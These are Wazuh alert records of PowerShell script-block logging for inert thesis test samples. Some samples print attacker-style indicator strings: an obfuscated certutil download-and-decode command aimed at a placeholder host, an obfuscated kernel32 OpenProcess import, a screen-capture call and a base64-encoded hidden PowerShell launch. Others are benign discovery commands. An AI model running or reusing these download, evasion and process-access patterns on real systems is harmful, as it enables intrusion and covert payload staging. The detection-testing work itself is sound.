{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b2af3d56-d619-4505-8bf4-abb02b346f02","scriptBlockText":"$sampleId='PST-028'; $parts=@('certutil.exe -ur','lcache -spli','t -f https://cert','.example.inval','id/blob.txt C:\\\\__T','HESIS_INERT__\\\\','blob.txt; c','ertutil.exe -deco','de C:\\\\__THESIS_IN','ERT__\\\\blob.txt C:','\\\\__THESIS_INER','T__\\\\stage.bin'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721578","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-028'; $parts=@('certutil.exe -ur','lcache -spli','t -f https://cert','.example.inval','id/blob.txt C:\\__T','HESIS_INERT__\\','blob.txt; c','ertutil.exe -deco','de C:\\__THESIS_IN','ERT__\\blob.txt C:','\\__THESIS_INER','T__\\stage.bin'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b2af3d56-d619-4505-8bf4-abb02b346f02\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:41.9673155Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:41.9673155Z\",\"eventRecordID\":\"721578\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-028'; $parts=@('certutil.exe -ur','lcache -spli','t -f https://cert','.example.inval','id/blob.txt C:\\\\__T','HESIS_INERT__\\\\','blob.txt; c','ertutil.exe -deco','de C:\\\\__THESIS_IN','ERT__\\\\blob.txt C:','\\\\__THESIS_INER','T__\\\\stage.bin'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b2af3d56-d619-4505-8bf4-abb02b346f02\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-028'; $parts=@('certutil.exe -ur','lcache -spli','t -f https://cert','.example.inval','id/blob.txt C:\\\\\\\\__T','HESIS_INERT__\\\\\\\\','blob.txt; c','ertutil.exe -deco','de C:\\\\\\\\__THESIS_IN','ERT__\\\\\\\\blob.txt C:','\\\\\\\\__THESIS_INER','T__\\\\\\\\stage.bin'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b2af3d56-d619-4505-8bf4-abb02b346f02\"}}}","id":"1784280942.395939","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:42.969+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"ad0bb236-3bb9-4262-bbe8-04a3c58d0df0","scriptBlockText":"$sampleId='PST-029'; Get-ChildItem Cert:\\\\CurrentUser\\\\My -ErrorAction SilentlyContinue | Select-Object -First 3 Subject, NotAfter; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721582","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-029'; Get-ChildItem Cert:\\CurrentUser\\My -ErrorAction SilentlyContinue | Select-Object -First 3 Subject, NotAfter; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: ad0bb236-3bb9-4262-bbe8-04a3c58d0df0\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:42.2883001Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:42.2883001Z\",\"eventRecordID\":\"721582\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-029'; Get-ChildItem Cert:\\\\CurrentUser\\\\My -ErrorAction SilentlyContinue | Select-Object -First 3 Subject, NotAfter; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: ad0bb236-3bb9-4262-bbe8-04a3c58d0df0\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-029'; Get-ChildItem Cert:\\\\\\\\CurrentUser\\\\\\\\My -ErrorAction SilentlyContinue | Select-Object -First 3 Subject, NotAfter; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"ad0bb236-3bb9-4262-bbe8-04a3c58d0df0\"}}}","id":"1784280942.398624","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script searching filesystem","firedtimes":1,"groups":["windows"," powershell"],"id":"91819","level":4,"mail":false,"mitre":{"id":["T1083"],"tactic":["Discovery"],"technique":["File and Directory Discovery"]}},"timestamp":"2026-07-17T11:35:42.977+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"e2d4c628-2d2f-4f40-8f77-70a0fa0356c6","scriptBlockText":"$sampleId='PST-030'; $u = [Uri]'https://intranet.example.local/monitoring/check?id=42'; Write-Output $u.Host; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721603","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-030'; $u = [Uri]'https://intranet.example.local/monitoring/check?id=42'; Write-Output $u.Host; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: e2d4c628-2d2f-4f40-8f77-70a0fa0356c6\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:43.7415141Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:43.7415141Z\",\"eventRecordID\":\"721603\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-030'; $u = [Uri]'https://intranet.example.local/monitoring/check?id=42'; Write-Output $u.Host; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: e2d4c628-2d2f-4f40-8f77-70a0fa0356c6\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-030'; $u = [Uri]'https://intranet.example.local/monitoring/check?id=42'; Write-Output $u.Host; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"e2d4c628-2d2f-4f40-8f77-70a0fa0356c6\"}}}","id":"1784280944.398624","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:44.289+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d3821113-3a8e-4085-b7f9-db0a2480cb9e","scriptBlockText":"$sampleId='PST-031'; Get-Acl -Path $env:TEMP | Select-Object Owner, AccessToString; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721606","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-031'; Get-Acl -Path $env:TEMP | Select-Object Owner, AccessToString; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d3821113-3a8e-4085-b7f9-db0a2480cb9e\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:44.0699119Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:44.0699119Z\",\"eventRecordID\":\"721606\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-031'; Get-Acl -Path $env:TEMP | Select-Object Owner, AccessToString; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d3821113-3a8e-4085-b7f9-db0a2480cb9e\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-031'; Get-Acl -Path $env:TEMP | Select-Object Owner, AccessToString; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d3821113-3a8e-4085-b7f9-db0a2480cb9e\"}}}","id":"1784280944.398624","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":5,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:35:44.336+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b69af7de-4f75-44a6-bf3f-6c627e02931c","scriptBlockText":"$sampleId='PST-032'; $indicator='add-TYpe -MEMBeRDeFInitiOn ''[dlLIMPort(\\\"kerNEl32.dLL\\\")] PuBLIc StaTIC EXtern intpTR openPRoCEsS(UINT accesS, bool INHerIt, INT PRoCEssiD);'' -NAMe naTivEMeTHoDs -NamespaCe ThESis.inErT'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721610","keywords":"0x0","level":"3","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-032'; $indicator='add-TYpe -MEMBeRDeFInitiOn ''[dlLIMPort(\"kerNEl32.dLL\")] PuBLIc StaTIC EXtern intpTR openPRoCEsS(UINT accesS, bool INHerIt, INT PRoCEssiD);'' -NAMe naTivEMeTHoDs -NamespaCe ThESis.inErT'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b69af7de-4f75-44a6-bf3f-6c627e02931c\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"WARNING","systemTime":"2026-07-17T09:35:44.4765974Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"3\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:44.4765974Z\",\"eventRecordID\":\"721610\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"WARNING\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-032'; $indicator='add-TYpe -MEMBeRDeFInitiOn ''[dlLIMPort(\\\"kerNEl32.dLL\\\")] PuBLIc StaTIC EXtern intpTR openPRoCEsS(UINT accesS, bool INHerIt, INT PRoCEssiD);'' -NAMe naTivEMeTHoDs -NamespaCe ThESis.inErT'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b69af7de-4f75-44a6-bf3f-6c627e02931c\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-032'; $indicator='add-TYpe -MEMBeRDeFInitiOn ''[dlLIMPort(\\\\\\\"kerNEl32.dLL\\\\\\\")] PuBLIc StaTIC EXtern intpTR openPRoCEsS(UINT accesS, bool INHerIt, INT PRoCEssiD);'' -NAMe naTivEMeTHoDs -NamespaCe ThESis.inErT'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b69af7de-4f75-44a6-bf3f-6c627e02931c\"}}}","id":"1784280945.401113","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:45.125+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d7d73619-688c-42b4-a39e-9a4d2ba02d63","scriptBlockText":"$sampleId='PST-033'; Get-Process ` | Select-Object -First 3 Name, Id; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721613","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-033'; Get-Process `\n| Select-Object -First 3 Name, Id; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d7d73619-688c-42b4-a39e-9a4d2ba02d63\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:44.8214637Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:44.8214637Z\",\"eventRecordID\":\"721613\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-033'; Get-Process `\\n| Select-Object -First 3 Name, Id; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d7d73619-688c-42b4-a39e-9a4d2ba02d63\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-033'; Get-Process ` | Select-Object -First 3 Name, Id; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d7d73619-688c-42b4-a39e-9a4d2ba02d63\"}}}","id":"1784280945.403425","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executing process discovery","firedtimes":1,"groups":["windows"," powershell"],"id":"91815","level":4,"mail":false,"mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]}},"timestamp":"2026-07-17T11:35:45.131+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"165c591b-9f0a-4394-bd41-f1dd51faff97","scriptBlockText":"$sampleId='PST-034'; $encoded='cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEUAbgBjAG8AZABlAGQAQwBvAG0AbQBhAG4AZAAgAFYAdwBCAHkAQQBHAGsAQQBkAEEAQgBsAEEAQwAwAEEAVAB3AEIAMQBBAEgAUQBBAGMAQQBCADEAQQBIAFEAQQBJAEEAQQBuAEEARgBRAEEAUwBBAEIARgBBAEYATQBBAFMAUQBCAFQAQQBDADAAQQBTAFEAQgBPAEEARQBVAEEAVQBnAEIAVQBBAEMAYwBBAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721628","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-034'; $encoded='cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEUAbgBjAG8AZABlAGQAQwBvAG0AbQBhAG4AZAAgAFYAdwBCAHkAQQBHAGsAQQBkAEEAQgBsAEEAQwAwAEEAVAB3AEIAMQBBAEgAUQBBAGMAQQBCADEAQQBIAFEAQQBJAEEAQQBuAEEARgBRAEEAUwBBAEIARgBBAEYATQBBAFMAUQBCAFQAQQBDADAAQQBTAFEAQgBPAEEARQBVAEEAVQBnAEIAVQBBAEMAYwBBAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 165c591b-9f0a-4394-bd41-f1dd51faff97\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:45.1895315Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:45.1895315Z\",\"eventRecordID\":\"721628\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-034'; $encoded='cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEUAbgBjAG8AZABlAGQAQwBvAG0AbQBhAG4AZAAgAFYAdwBCAHkAQQBHAGsAQQBkAEEAQgBsAEEAQwAwAEEAVAB3AEIAMQBBAEgAUQBBAGMAQQBCADEAQQBIAFEAQQBJAEEAQQBuAEEARgBRAEEAUwBBAEIARgBBAEYATQBBAFMAUQBCAFQAQQBDADAAQQBTAFEAQgBPAEEARQBVAEEAVQBnAEIAVQBBAEMAYwBBAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 165c591b-9f0a-4394-bd41-f1dd51faff97\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-034'; $encoded='cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEUAbgBjAG8AZABlAGQAQwBvAG0AbQBhAG4AZAAgAFYAdwBCAHkAQQBHAGsAQQBkAEEAQgBsAEEAQwAwAEEAVAB3AEIAMQBBAEgAUQBBAGMAQQBCADEAQQBIAFEAQQBJAEEAQQBuAEEARgBRAEEAUwBBAEIARgBBAEYATQBBAFMAUQBCAFQAQQBDADAAQQBTAFEAQgBPAEEARQBVAEEAVQBnAEIAVQBBAEMAYwBBAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"165c591b-9f0a-4394-bd41-f1dd51faff97\"}}}","id":"1784280946.403425","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":4,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:35:46.203+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c0638034-0b91-4112-bce0-b7ae8f8de743","scriptBlockText":"$sampleId='PST-035'; $indicator='[sYStem.DRaWinG.GRAphics]::fromiMAGe($bmP).cOPyfrOMSCreEN(0,0,0,0,$BMp.sIZE)'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721629","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-035'; $indicator='[sYStem.DRaWinG.GRAphics]::fromiMAGe($bmP).cOPyfrOMSCreEN(0,0,0,0,$BMp.sIZE)'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c0638034-0b91-4112-bce0-b7ae8f8de743\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:45.5219487Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:45.5219487Z\",\"eventRecordID\":\"721629\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-035'; $indicator='[sYStem.DRaWinG.GRAphics]::fromiMAGe($bmP).cOPyfrOMSCreEN(0,0,0,0,$BMp.sIZE)'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c0638034-0b91-4112-bce0-b7ae8f8de743\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-035'; $indicator='[sYStem.DRaWinG.GRAphics]::fromiMAGe($bmP).cOPyfrOMSCreEN(0,0,0,0,$BMp.sIZE)'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c0638034-0b91-4112-bce0-b7ae8f8de743\"}}}","id":"1784280946.405533","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:46.206+0200"}
